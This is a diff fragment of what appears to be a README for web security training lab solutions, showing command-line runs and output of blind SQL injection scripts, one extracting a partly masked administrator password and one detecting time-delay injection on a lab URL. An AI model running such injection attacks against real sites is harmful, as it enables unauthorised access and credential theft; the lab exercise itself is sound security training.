@@ -17,3 +17,8 @@ Checking Administrator account: True
 Checking password length: 20
 Extracting Admin password: fbut9j14XXXXXXXXXXXX
 ```
+#### Lab: Blind SQL injection with time delays check
+```sh
+$ python blind_sql_injection_time_delay_test.py https://ac521fdc1ea4123980d0baf50078008e.web-security-academy.net
+SQL Time Delay Injection detected
+```
